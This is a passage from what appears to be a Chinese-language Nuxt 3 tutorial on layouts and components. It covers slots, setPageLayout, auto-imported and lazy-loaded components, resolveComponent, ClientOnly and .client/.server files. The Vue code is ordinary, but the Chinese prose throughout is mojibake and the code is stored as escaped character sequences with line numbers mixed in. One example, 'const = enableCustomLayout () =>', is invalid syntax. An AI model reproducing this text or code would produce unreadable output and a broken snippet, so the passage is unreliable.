10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;NuxtLayout name=\u0026#34;custom\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;éµäººè³½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; definePageMeta({ layout: false }) \u0026lt;/script\u0026gt; ç•¶å¸ƒå±€æ¨¡æ¿å¯ä»¥åœ¨ template ä¸­è¨­å®šä½¿ç”¨ï¼Œæˆ‘å€‘å°±èƒ½çµåˆæ’æ§½ç”šè‡³å‹•æ…‹çš„èª¿æ•´ name å±¬æ€§ï¼Œåšå‡ºæ›´å¤šæ¨£éˆæ´»çš„å¸ƒå±€æ•ˆæœã€‚\nä¸Šåœ–çš„åƒè€ƒç¨‹å¼ç¢¼ï¼š\nlayouts/custom.vue 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-rose-100 py-2\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 py-4 text-2xl text-gray-700\u0026#34;\u0026gt; ä½¿ç”¨ \u0026lt;span class=\u0026#34;font-bold text-rose-500\u0026#34;\u0026gt;Custom\u0026lt;/span\u0026gt; å¸ƒå±€ \u0026lt;/p\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;slot name=\u0026#34;footer\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; pages/custom.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;template\u0026gt; \u0026lt;NuxtLayout name=\u0026#34;custom\u0026#34;\u0026gt; \u0026lt;template #default\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;éµäººè³½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #footer\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-xl text-slate-600\u0026#34;\u0026gt;æ„Ÿè¬æ‚¨é–±è®€ Nuxe 3 å­¸ç¿’ç­†è¨˜ï½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; definePageMeta({ layout: false }) \u0026lt;/script\u0026gt; ç•¶ä½ ä½¿ç”¨ definePageMeta æ–¹æ³•ï¼Œç¦æ­¢ä½¿ç”¨é è¨­çš„å¸ƒå±€æ¨¡æ¿å¾Œï¼Œä½ ä¹Ÿèƒ½ä½¿ç”¨ setPageLayout æ–¹æ³•ä¾†å‹•æ…‹æ”¹è®Šå¸ƒå±€ã€‚\nä¾‹å¦‚ï¼š\n1 2 3 4 5 \u0026lt;script setup\u0026gt; const = enableCustomLayout () =\u0026gt; { setPageLayout(\u0026#39;custom\u0026#39;) } \u0026lt;/script\u0026gt; ç•¶ä½ çœ‹éäº†é€™ç¯‡å…§å®¹å¾Œï¼Œä½ æœƒç™¼ç¾ Nuxt 3 æ‰€æä¾›çš„å¸ƒå±€æ¨¡æ¿éå¸¸çš„å¥½ç”¨ï¼Œå¸ƒå±€æ¨¡æ¿è¦åŠƒå¥½å¾Œï¼Œçˆ¾å¾Œé é¢æ‰€ä½¿ç”¨åˆ°çš„ç›¸åŒå¸ƒå±€ï¼Œåªéœ€è¦æ›´æ”¹åŒä¸€å€‹å¸ƒå±€æ¨¡æ¿ï¼Œå¦‚æœå†çµåˆå…ƒä»¶åŒ–æŠ€å·§ï¼Œæ›´æ˜¯è®“ä½ çš„ç¨‹å¼ç¢¼å…¼å…·é‡è¤‡ä½¿ç”¨æ€§èˆ‡ç¶­è­·æ€§ã€‚\nå…ƒä»¶ (Components) åœ¨å»ºç«‹ Vue çš„ç¶²ç«™é–‹ç™¼éç¨‹ä¸­ï¼Œæˆ‘å€‘å¯èƒ½æœƒè‡ªå·±å°è£å…ƒä»¶ (Component) è®“ç¨‹å¼ç¢¼å¯ä»¥è¢«é‡è¤‡ä½¿ç”¨ï¼Œä¹Ÿæ–¹ä¾¿é–‹ç™¼è€…ç¶­è­·ï¼Œé€™äº›ä¸€å€‹å€‹çš„å…ƒä»¶ï¼Œå¯ä»¥é€éå…¨åŸŸè¨»å†Š (Global Registration) è®“æ•´å€‹ Vue æ‡‰ç”¨ç¨‹å¼ä¸­éƒ½å¯ä»¥ä½¿ç”¨é€™å€‹å…ƒä»¶ï¼Œä¹Ÿå¯ä»¥é€éå€åŸŸè¨»å†Š (Local Registration) æ–¼ç‰¹å®šçš„å…ƒä»¶å†è¼‰å…¥ä½¿ç”¨ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä»‹ç´¹ Nuxt 3 ä½¿ç”¨å…ƒä»¶æ™‚æ‡‰è©²éµå¾ªçš„è¦ç¯„åŠç‰¹è‰²ã€‚\nå…ƒä»¶è‡ªå‹•è¼‰å…¥ åœ¨ Vue ä¸­ï¼Œé›–ç„¶å€åŸŸè¨»å†Šä½¿å¾—å…ƒä»¶é–“çš„ä¾è³´é—œä¿‚æ›´åŠ æ˜ç¢ºä¹Ÿå°æ–¼ Tree shaking æ›´åŠ å‹å¥½ï¼Œä½†æˆ‘å€‘åœ¨ä½¿ç”¨å…ƒä»¶æ™‚ï¼Œå°±å¾—åœ¨éœ€è¦çš„åœ°æ–¹å€‹åˆ¥è¼‰å…¥åŠè¨»å†Šã€‚è€Œ Nuxt 3 æä¾›åœ¨ components ç›®éŒ„ä¸‹å°ˆé–€æ”¾è‡³é€™äº›å…ƒä»¶ï¼Œä¸¦å…·æœ‰è‡ªå‹•è¼‰å…¥åŠå»¶é²è¼‰å…¥ç­‰åŠŸèƒ½ç‰¹è‰²ã€‚\nå»ºç«‹èˆ‡ä½¿ç”¨å…ƒä»¶ æ–°å¢ ./components/IronManWelcome.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\ncomponents/IronManWelcome.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;éµäººè³½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; èª¿æ•´ ./app.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\napp.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; ç•¶æˆ‘å€‘å»ºç«‹äº† ./components/IronManWelcome.vue æª”æ¡ˆå¾Œï¼ŒNuxt æœƒè‡ªå‹•è¼‰å…¥ ./components ç›®éŒ„ä¸­çš„ä»»ä½•å…ƒä»¶ï¼Œåœ¨ä½¿ç”¨æ™‚çš„å…ƒä»¶åç¨±ä¹Ÿå°æ‡‰è‘—æª”æ¡ˆåç¨±ï¼Œæ‰€ä»¥æˆ‘å€‘åªéœ€ç›´æ¥æ·»åŠ  \u0026lt;IronManWelcome /\u0026gt; å°±å¯ä»¥ç›´äº›ä½¿ç”¨é€™å€‹å…ƒä»¶ã€‚\nå…ƒä»¶åç¨± Nuxt æ‰€è‡ªå‹•è¼‰å…¥ ./components ç›®éŒ„ä¸‹çš„å…ƒä»¶ï¼Œåœ¨ä½¿ç”¨æ™‚çš„å…ƒä»¶åç¨±ä¹Ÿå°æ‡‰è‘—æª”æ¡ˆåç¨±ï¼Œè€Œç•¶ä½ åœ¨å·¢ç‹€çš„ç›®éŒ„çµæ§‹ä¸‹çš„å…ƒä»¶ï¼Œå…ƒä»¶çš„åç¨±å°‡æœƒåŸºæ–¼ç›®éŒ„çš„è·¯å¾‘èˆ‡æª”æ¡ˆåç¨±ï¼Œä¸¦åˆªé™¤é‡è¤‡çš„å­—æ®µã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœ ./components ç›®éŒ„çµæ§‹å¦‚ä¸‹ï¼š\n1 2 3 4 components/ â””â”€â”€ base/ â””â”€â”€ apply/ â””â”€â”€ Button.vue ./components/base/apply/Button.vue å…ƒä»¶çš„åç¨±å°±æœƒæ˜¯ç”±ç›®éŒ„èˆ‡æª”æ¡ˆåç¨±çµ„åˆå‡ºçš„ \u0026lt;BaseApplyButton\u0026gt;ã€‚\nç‚ºäº†é–‹ç™¼ä¸Šèƒ½æ›´æ¸…æ¥šè¾¨åˆ¥ï¼Œå»ºè­°å°‡æª”æ¡ˆåç¨±è¨­ç½®èˆ‡ä½¿ç”¨å…ƒä»¶æ™‚çš„åç¨±ç›¸åŒï¼Œæ‰€ä»¥æˆ‘å€‘é‡æ–°å‘½å ./components/base/apply/ ä¸‹çš„ Button.vue ç‚º BaseApplyButton.vueã€‚\n1 2 3 4 components/ â””â”€â”€ base/ â””â”€â”€ apply/ â””â”€â”€ BaseApplyButton.vue ä½ ä¹Ÿä¸ç”¨æ“”å¿ƒå…ƒä»¶åç¨±æœƒä¸æœƒè®Šæˆ \u0026lt;BaseApplyBaseApplyButton\u0026gt; çœ‹èµ·ä¾†æœ‰é»é†œé†œçš„ï¼Œå› ç‚º Nuxt æœƒå¹«æˆ‘å€‘åˆªé™¤é‡è¤‡çš„å­—æ®µï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨æ™‚å…ƒä»¶åç¨±ç‚º \u0026lt;BaseApplyButton\u0026gt;ã€‚\nå…ƒä»¶åç¨±çš„å‘½åè¦å‰‡ Vue åœ¨è¨»å†Šå…ƒä»¶æ™‚ï¼Œå¯ä»¥ä½¿ç”¨å¤§é§å³°å¼å‘½åæ³• (Pascal Case) æˆ–çƒ¤è‚‰ä¸²å‘½åæ³• (Kebab Case) ä¾†ç‚ºå…ƒä»¶å‘½åï¼Œä¸¦åœ¨ template ä¹Ÿå¯ä»¥è‡ªç”±ä½¿ç”¨å…©ç¨®å‘½åæ–¹å¼ä½œç‚ºä½¿ç”¨å…ƒä»¶çš„æ¨™ç±¤ã€‚\nä¾‹å¦‚ï¼Œä»¥ \u0026lt;base-apply-button\u0026gt; ä¾†è¡¨ç¤ºä½¿ç”¨ ./components/base/apply/BaseApplyButton.vue å…ƒä»¶ã€‚\næŠ‘æˆ–å»ºç«‹ ./components/base/apply/base-apply-button.vue å…ƒä»¶ï¼Œä½¿ç”¨æ™‚ä»¥ \u0026lt;BaseApplyButton\u0026gt; è¡¨ç¤ºã€‚\nå…©ç¨®æ–¹å¼ Nuxt éƒ½æ”¯æ´ï¼Œå¯ä»¥æ ¹æ“šè‡ªå·±çš„ç¿’æ…£åšé¸æ“‡ï¼Œè€Œæˆ‘å€‹äººæ˜¯ä»¥å¤§é§å³°å¼å‘½åæ³• (Pascal Case) ç‚ºä¸»ï¼Œä»¥æ­¤å€åˆ¥ç‚ºè‡ªå·±å»ºç«‹çš„å…ƒä»¶ã€‚\nå‹•æ…‹å…ƒä»¶ (Dynamic Components) å¦‚æœæƒ³è¦ä½¿ç”¨åƒ Vue ä¸­çš„ \u0026lt;component :is=\u0026quot;someComputedComponent\u0026quot;\u0026gt; ä¾†å‹•æ…‹çš„åˆ‡æ›ä¸åŒçš„å…ƒä»¶ï¼Œå‰‡éœ€è¦ä½¿ç”¨ Vue æä¾›çš„ resolveComponentVue æ–¹æ³•ä¾†é€²è¡Œè¼”åŠ©ã€‚\nä¾‹å¦‚ï¼š\n1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;component :is=\u0026#34;show ? DynamicComponent : \u0026#39;div\u0026#39;\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const show = ref(false) const DynamicComponent = resolveComponent(\u0026#39;BaseApplyButton\u0026#39;) \u0026lt;/script\u0026gt; å»ºç«‹å‹•æ…‹å…ƒä»¶ Step 1. å»ºç«‹å…ƒä»¶ æ–°å¢ ./components/base/apply/BaseApplyButton.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\ncomponents/base/apply/BaseApplyButton.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;mt-6 bg-blue-600 py-3 px-8 text-xl font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; \u0026gt; ç«‹å³å ±å \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; æ–°å¢ ./components/round/apply/RoundApplyButton.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\ncomponents/round/apply/RoundApplyButton.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;mt-6 rounded-full bg-blue-600 py-3 px-8 text-xl font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; \u0026gt; ç«‹å³å ±å \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; Step 2. ä½¿ç”¨ resolveComponent() èª¿æ•´ ./app.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex items-center\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;show-button\u0026#34; v-model=\u0026#34;useRound\u0026#34; name=\u0026#34;show-button\u0026#34; type=\u0026#34;checkbox\u0026#34; class=\u0026#34;h-5 w-5\u0026#34; /\u0026gt; \u0026lt;label for=\u0026#34;show-button\u0026#34; class=\u0026#34;ml-2 block text-base text-slate-800\u0026#34;\u0026gt;ä½¿ç”¨åœ“è§’æŒ‰éˆ•\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;component :is=\u0026#34;useRound ? RoundButton : BaseButton\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const useRound = ref(false) const BaseButton = resolveComponent(\u0026#39;BaseApplyButton\u0026#39;) const RoundButton = resolveComponent(\u0026#39;RoundApplyButton\u0026#39;) \u0026lt;/script\u0026gt; å‘ˆç¾æ•ˆæœï¼š\nå‹•æ…‹è¼‰å…¥ (Dynamic Imports) å‹•æ…‹è¼‰å…¥ (Dynamic Imports) å…ƒä»¶ä¹Ÿç¨±ä¹‹ç‚ºå»¶é²è¼‰å…¥ (lazy-loading)ï¼Œå¦‚æœé é¢ä¸­ä¸éœ€è¦ç«‹åˆ»ä½¿ç”¨æˆ–é¡¯ç¤ºæŸå€‹å…ƒä»¶ï¼Œé€éå‹•æ…‹è¼‰å…¥çš„æ–¹å¼å¯ä»¥å»¶é²å…ƒä»¶è¼‰å…¥çš„æ™‚é–“é»ï¼Œæœ‰åŠ©æ–¼å„ªåŒ– JavaScript é¦–æ¬¡è¼‰å…¥æ™‚çš„æª”æ¡ˆå¤§å°ã€‚\nä½¿ç”¨çš„æ–¹å¼ä¹Ÿéå¸¸ç°¡å–®ï¼Œåªéœ€è¦åœ¨ä½¿ç”¨å…ƒä»¶æ™‚ï¼ŒåŠ ä¸Šå‰ç¶´ Lazy å°±å¯ä»¥æœ‰å»¶é²è¼‰å…¥çš„æ•ˆæœã€‚\nå»ºç«‹ä¸€å€‹å‹•æ…‹è¼‰å…¥çš„æŒ‰éˆ• Step 1. å»ºç«‹æŒ‰éˆ•å…ƒä»¶ æ–°å¢ ./components/base/apply/BaseApplyButton.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\ncomponents/base/apply/BaseApplyButton.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;mt-6 rounded-sm bg-blue-600 py-3 px-8 text-xl font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; \u0026gt; ç«‹å³å ±å \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; Step 2. æ·»åŠ  Lazy å‰ç¶´ èª¿æ•´ ./app.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex items-center\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;show-button\u0026#34; v-model=\u0026#34;show\u0026#34; name=\u0026#34;show-button\u0026#34; type=\u0026#34;checkbox\u0026#34; class=\u0026#34;h-5 w-5\u0026#34; /\u0026gt; \u0026lt;label for=\u0026#34;show-button\u0026#34; class=\u0026#34;ml-2 block text-base text-slate-800\u0026#34;\u0026gt;é¡¯ç¤ºå ±åæŒ‰éˆ•\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;LazyBaseApplyButton v-if=\u0026#34;show\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const show = ref(false) \u0026lt;/script\u0026gt; çœ‹çœ‹å»¶é²è¼‰å…¥çš„æ•ˆæœï¼š\nåœ¨é é¢ä¸Šæœ‰ä¸€å€‹æ ¸å–æ–¹å¡Šï¼Œä½¿ç”¨è€…å‹¾é¸æ™‚æ‰é¡¯ç¤ºæŒ‰éˆ•ï¼Œæˆ‘å€‘é€éç€è¦½å™¨çš„é–‹ç™¼è€…å·¥å…·è§€å¯Ÿç¶²è·¯ (Network) çš„ä½¿ç”¨æƒ…æ³ï¼Œå¯ä»¥ç™¼ç¾åªæœ‰é¦–æ¬¡å‹¾é¸å¾Œæ‰è«‹æ±‚äº† BaseApplyButton.vue æŒ‰éˆ•å…ƒä»¶ JSã€‚ç•¶é€™å€‹æŒ‰éˆ•å…ƒä»¶è¢«è¨­ç½®ç‚º Lazy å‹•æ…‹è¼‰å…¥æ™‚ï¼Œé é¢é¦–æ¬¡è¼‰å…¥å…¶å¯¦ä¸æœƒåŒ…å«é€™å€‹æŒ‰éˆ•çš„ç¨‹å¼ç¢¼ï¼Œè€Œæ˜¯ç­‰å¾…éœ€è¦é€™å€‹å…ƒä»¶æ™‚æ‰å»è«‹æ±‚ä¸‹è¼‰ï¼Œä»¥æ­¤é”åˆ°å»¶é²è¼‰å…¥çš„æ•ˆæœï¼ŒåŒæ™‚ä¹Ÿé™ä½é¦–æ¬¡é€²å…¥ç¶²é æ™‚éœ€è¦ä¸‹è¼‰çš„ JavaScript ç¨‹å¼ç¢¼å¤§å°ã€‚\næ§åˆ¶ä¼ºæœå™¨ç«¯æˆ–å®¢æˆ¶ç«¯æ¸²æŸ“å…ƒä»¶ \u0026lt;ClientOnly\u0026gt; å…ƒä»¶ Nuxt 3 æä¾›äº†ä¸€å€‹ \u0026lt;ClientOnly\u0026gt; å…ƒä»¶ï¼Œå¯ä»¥æ§åˆ¶è¢«åŒ…è£¹çš„å…ƒä»¶åƒ…åœ¨å®¢æˆ¶ç«¯é€²è¡Œæ¸²æŸ“ã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘å»ºç«‹ ./components/IronManWelcome.vue æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\ncomponents/IronManWelcome.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;éµäººè³½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; ä½¿ç”¨ \u0026lt;ClientOnly\u0026gt; å…ƒä»¶åŒ…è£¹ \u0026lt;IronManWelcome\u0026gt;ã€‚\nèª¿æ•´ ./app.vue ä¸­ï¼Œå…§å®¹å¦‚ä¸‹ï¼š\napp.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; é€™æ¨£å°±å¯ä»¥å°‡ \u0026lt;IronManWelcome\u0026gt; å…ƒä»¶è¨­å®šç‚ºåƒ…åœ¨å®¢æˆ¶ç«¯é€²è¡Œæ¸²æŸ“ï¼Œé¦–æ¬¡è«‹æ±‚é é¢æ™‚å°‡ä¸æœƒåŒ…å«é€™å€‹å…ƒä»¶çš„ HTMLã€‚\n\u0026lt;ClientOnly\u0026gt; å…ƒä»¶ä¸­æä¾›äº†ä¸€å€‹åç‚º fallback çš„æ’æ§½ (Slot)ï¼Œå¯ä»¥ç”¨ä½œæ–¼åœ¨ä¼ºæœå™¨æ¸²æŸ“çš„é è¨­å…§å®¹ï¼Œç­‰åˆ°å®¢æˆ¶ç«¯è¼‰å…¥å®Œæˆæ‰æ¥æ‰‹æ¸²æŸ“è¢«åŒ…è£¹çš„ \u0026lt;IronManWelcome\u0026gt; å…ƒä»¶ã€‚\nèª¿æ•´ ./app.vue ä¸­ï¼Œå…§å®¹å¦‚ä¸‹ï¼š\napp.vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;template #fallback\u0026gt; \u0026lt;p class=\u0026#34;my-6 flex justify-center\u0026#34;\u0026gt;[IronManWelcome] è¼‰å…¥ä¸­...\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; ç•¶é€²å…¥é¦–æ¬¡ç¶²é ï¼Œæœƒå…ˆæ¸²æŸ“ fallback æ’æ§½å…§çš„å…ƒç´ ï¼Œæ‰€ä»¥ç€è¦½å™¨å…ˆé¡¯ç¤º [IronManWelcome] è¼‰å…¥ä¸­\u0026hellip; æ–‡å­—ï¼Œæ¥è‘—å®¢æˆ¶ç«¯è¼‰å…¥å®Œ JS å¾Œæ¥æ‰‹æ¸²æŸ“ \u0026lt;IronManWelcome\u0026gt; å…ƒä»¶ã€‚\nä½ ä¹Ÿå¯ä»¥é€éç€è¦½å™¨é é¢ä¸­é»æ“Šå³éµå¾Œå±•é–‹é¸å–®çš„ã€Œæª¢è¦–ç¶²é åŸå§‹ç¢¼ã€åŠŸèƒ½ï¼Œæ‰€çœ‹åˆ°çš„ç¶²é åŸå§‹ç¢¼ï¼Œç™¼ç¾ä¼ºæœå™¨ç«¯åƒ…å…ˆå›æ‡‰äº† \u0026lt;p class=\u0026quot;my-6 flex justify-center\u0026quot;\u0026gt;[IronManWelcome] è¼‰å…¥ä¸­...\u0026lt;/p\u0026gt;ï¼Œè¡¨ç¤ºé€™æ˜¯ç”±ä¼ºæœå™¨ç«¯æ¸²æŸ“ \u0026lt;ClientOnly\u0026gt; å…ƒä»¶ fallback æ’æ§½çš„å…§å®¹ã€‚\n.client èˆ‡ .server Nuxt 3 çš„å…ƒä»¶ï¼Œä¹Ÿå¯ä»¥é€éå…ƒä»¶çš„æª”æ¡ˆåç¨±ä¾†æ§åˆ¶åƒ…é¡¯ç¤ºåœ¨å®¢æˆ¶ç«¯æˆ–ä¼ºæœå™¨ç«¯ã€‚\nå¦‚æœå…ƒä»¶åƒ…åœ¨å®¢æˆ¶ç«¯å‘ˆç¾ï¼Œå‰‡å¯ä»¥å°‡ .client åŠ å…¥å…ƒä»¶æª”åçš„å¾Œç¶´ä¸­ã€‚\nå»ºç«‹ä¸€å€‹ ./components/JustClient.client.vue å…ƒä»¶æª”æ¡ˆï¼Œè¡¨ç¤º \u0026lt;JustClient\u0026gt; å…ƒä»¶ï¼Œåƒ…æœƒåœ¨å®¢æˆ¶ç«¯é€²è¡Œæ¸²æŸ“ã€‚\nè€Œæ·»åŠ  .server å¾Œç¶´çš„å…ƒä»¶æª”æ¡ˆï¼Œå‰‡æœƒæ˜¯é€™å€‹å…ƒä»¶åœ¨ä¼ºæœå™¨ç«¯æ¸²æŸ“çš„å…§å®¹ã€‚\næ§åˆ¶ä¼ºæœå™¨ç«¯æˆ–å®¢æˆ¶ç«¯æ¸²æŸ“å…ƒä»¶ç¯„ä¾‹ æˆ‘å€‘ä½¿ç”¨ \u0026lt;ClientOnly\u0026gt; å…ƒä»¶ã€.client èˆ‡ .server åšä¸€å€‹ç¯„ä¾‹ä¾†çœ‹å‘ˆç¾çš„æ•ˆæœã€‚\ncomponents/IronManWelcome.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;éµäººè³½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; components/JustClient.client.vue 1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-16 my-4 rounded-lg bg-green-100 p-4 text-sm text-green-700\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;font-semibold\u0026#34;\u0026gt;[JustClient]\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;ml-2\u0026#34;\u0026gt;é€™æ˜¯åªæœ‰åœ¨ \u0026lt;span class=\u0026#34;font-bold\u0026#34;\u0026gt;Client\u0026lt;/span\u0026gt; æ‰æœƒæ¸²æŸ“çš„å…ƒä»¶\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; components/ClientAndServer.client.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-16 my-4 rounded-lg bg-sky-100 p-4 text-sm text-sky-700\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;font-semibold\u0026#34;\u0026gt;[ClientAndServer]\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;ml-2\u0026#34;\u0026gt; é€™æ˜¯å¾ \u0026lt;span class=\u0026#34;font-bold text-red-500\u0026#34;\u0026gt;Client\u0026lt;/span\u0026gt; æ¸²æŸ“å‡ºä¾†çš„å…ƒä»¶ \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; components/ClientAndServer.server.vue 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-16 my-4 rounded-lg bg-sky-100 p-4 text-sm text-sky-700\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;font-semibold\u0026#34;\u0026gt;[ClientAndServer]\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;ml-2\u0026#34;\u0026gt; é€™æ˜¯å¾ \u0026lt;span class=\u0026#34;font-bold text-red-500\u0026#34;\u0026gt;Server\u0026lt;/span\u0026gt; æ¸²æŸ“å‡ºä¾†çš„å…ƒä»¶ï¼Œè«‹ç­‰å¾… Client æ¥æ‰‹æ¸²æŸ“ \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; app.vue 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;template #fallback\u0026gt; \u0026lt;p class=\u0026#34;my-6 flex justify-center\u0026#34;\u0026gt;[IronManWelcome] è¼‰å…¥ä¸­...\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;JustClient /\u0026gt; \u0026lt;ClientAndServer /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; æˆ‘å€‘é‡æ–°ç€è¦½ç¶²é 